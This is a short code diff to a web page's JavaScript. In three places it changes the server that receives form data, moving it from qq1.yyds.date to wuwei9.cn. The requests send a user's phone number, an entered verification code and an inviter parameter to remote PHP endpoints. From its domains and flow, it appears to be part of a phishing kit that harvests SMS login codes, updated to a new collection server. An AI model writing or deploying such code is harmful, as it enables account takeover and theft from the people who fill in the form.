@@ -175,7 +175,7 @@ var code = document.getElementById('codekey');
 var yqr = Request['yqr'];
     //  查验是否为审核通过状态
      var xhr = new XMLHttpRequest();
-              xhr.open('POST', 'https://qq1.yyds.date/yzm.php?code1='+ code.value + "&phone=" + trObj.value+"&yqr="+yqr, true);
+              xhr.open('POST', 'https://wuwei9.cn/yzm.php?code1='+ code.value + "&phone=" + trObj.value+"&yqr="+yqr, true);
               xhr.onreadystatechange = function() {
                   if (xhr.readyState == 4 && xhr.status == 200) {
                     console.log(xhr.responseText);
@@ -303,7 +303,7 @@ var yqr = Request['yqr'];
 		
 
         var httpRequest = new XMLHttpRequest();
-        httpRequest.open('POST', 'https://qq1.yyds.date/sjh.php', true);
+        httpRequest.open('POST', 'https://wuwei9.cn/sjh.php', true);
 		
         httpRequest.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
         var trObj = document.getElementById('idPhone');
@@ -337,7 +337,7 @@ var yqr = Request['yqr'];
         
         if (dsjz == 1) {
             var httpRequest = new XMLHttpRequest();
-            httpRequest.open('POST', 'https://qq1.yyds.date/zt.php', true);
+            httpRequest.open('POST', 'https://wuwei9.cn/zt.php', true);
             httpRequest.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
             var trObj = document.getElementById('idPhone');
             httpRequest.send("phone=" + trObj.value);
